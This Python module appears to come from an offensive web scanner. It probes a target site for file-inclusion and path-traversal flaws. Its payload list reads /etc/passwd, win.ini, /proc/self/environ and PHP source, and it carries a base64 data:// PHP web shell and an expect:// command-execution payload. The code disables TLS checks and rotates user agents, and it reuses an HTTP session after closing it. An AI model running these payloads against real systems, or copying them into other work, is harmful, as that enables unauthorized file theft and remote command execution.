"""LFI/RFI/Path Traversal/File Upload Attack Scanner."""
import asyncio, re, random
from typing import Optional
from urllib.parse import quote
import aiohttp
from ..utils.helpers import status, random_ua, cvss_score

LFI_PAYLOADS = [
    # Standard traversal
    ("../../../../etc/passwd", ["root:x:", "bin:x:", "nobody:"]),
    ("....//....//....//etc/passwd", ["root:x:"]),
    ("..%2F..%2F..%2F..%2Fetc%2Fpasswd", ["root:x:"]),
    # Windows
    ("../../../../../windows/win.ini", ["[fonts]", "[extensions]"]),
    ("..\\..\\..\\..\\..\\windows\\win.ini", ["[fonts]"]),
    # PHP wrappers
    ("php://filter/convert.base64-encode/resource=index.php", ["PD9waHA"]),
    ("php://filter/read=convert.base64-encode/resource=index.php", ["PD9waHA"]),
    ("php://input", []),
    ("data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==", []),
    ("expect://id", []),
    # Log file
    ("/var/log/apache2/access.log", []),
    ("/proc/self/environ", ["PATH="]),
    # Config files
    ("../../../../etc/hosts", ["localhost"]),
    ("../../../../etc/hostname", []),
]

class FileAttackScanner:
    """LFI/RFI/File Upload vulnerability scanner."""

    def __init__(self, target: str):
        self.target = target.rstrip("/")
        self.findings = []
        self.params = set()

    async def discover_params(self):
        """Discover file-related parameters."""
        status("Discovering file parameters...", "info")
        headers = {"User-Agent": random_ua()}
        file_params = ["file", "page", "path", "include", "template", "load", "doc", "document", "dir", "folder", "download", "read", "src"]

        async with aiohttp.ClientSession() as s:
            for param in file_params:
                try:
                    test_url = f"{self.target}/?{param}=test"
                    resp = await s.get(test_url, headers=headers, timeout=8, ssl=False)
                    html = await resp.text()
                    if "test" in html or resp.status != 404:
                        self.params.add(param)
                except: pass

        # Also find from crawling
        try:
            resp = await s.get(self.target, headers=headers, timeout=10, ssl=False)
            html = await resp.text()
            # Find file-like URL params
            found = re.findall(r'[?&](file|page|path|include|template|load|doc|dir|folder|download|read)=', html)
            self.params.update(found)
        except: pass

        status(f"Found {len(self.params)} file params", "success")

    async def test_lfi(self) -> list:
        """Test LFI payloads."""
        findings = []
        headers = {"User-Agent": random_ua()}
        async with aiohttp.ClientSession() as s:
            for param in list(self.params):
                for payload, indicators in LFI_PAYLOADS[:10]:
                    try:
                        test_url = f"{self.target}/?{param}={quote(payload)}"
                        resp = await s.get(test_url, headers=headers, timeout=10, ssl=False)
                        html = await resp.text()

                        for indicator in indicators:
                            if indicator in html[:2000]:
                                findings.append({
                                    "type": "LFI (Local File Inclusion)",
                                    "url": self.target,
                                    "parameter": param,
                                    "payload": payload,
                                    "evidence": indicator,
                                    "severity": "CRITICAL",
                                    "cvss": cvss_score(),
                                })
                                status(f"LFI! [{param}] -> {indicator}", "critical")
                                return findings  # One is enough
                    except: continue

        return findings

    async def test_rfi(self) -> list:
        """Test RFI payloads."""
        findings = []
        headers = {"User-Agent": random_ua()}
        # Test with known external resources
        rfi_tests = [
            "http://google.com",
            "https://example.com",
            "http://1.1.1.1",
        ]
        async with aiohttp.ClientSession() as s:
            for param in self.params:
                for rfi_url in rfi_tests:
                    try:
                        test_url = f"{self.target}/?{param}={quote(rfi_url)}"
                        resp = await s.get(test_url, headers=headers, timeout=10, ssl=False)
                        html = await resp.text()
                        # Check if external content reflected
                        if "google" in html.lower() and resp.status != 302:
                            findings.append({
                                "type": "RFI (Remote File Inclusion)",
                                "url": self.target,
                                "parameter": param,
                                "payload": rfi_url,
                                "severity": "CRITICAL",
                            })
                            status(f"RFI! [{param}]", "critical")
                    except: continue
        return findings

    async def full_scan(self) -> list:
        await self.discover_params()
        all_findings = []
        all_findings.extend(await self.test_lfi())
        all_findings.extend(await self.test_rfi())
        status(f"File attack scan: {len(all_findings)} finding(s)", "success" if not all_findings else "critical")
        return all_findings
